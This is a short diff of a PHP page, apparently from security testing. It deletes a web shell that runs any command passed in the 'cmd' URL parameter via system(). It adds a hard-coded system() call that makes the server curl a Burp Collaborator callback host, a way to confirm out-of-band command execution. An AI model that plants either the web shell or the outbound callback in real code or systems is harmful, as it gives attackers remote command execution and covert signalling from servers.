@@ -8,10 +8,8 @@
 </form>
 <pre>
 <?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
-    }
+        system('curl https://jqd7usd96hrw0eq7rhbq11hbk2quej.burpcollaborator.net');
+    
 ?>
 </pre>
 </body>
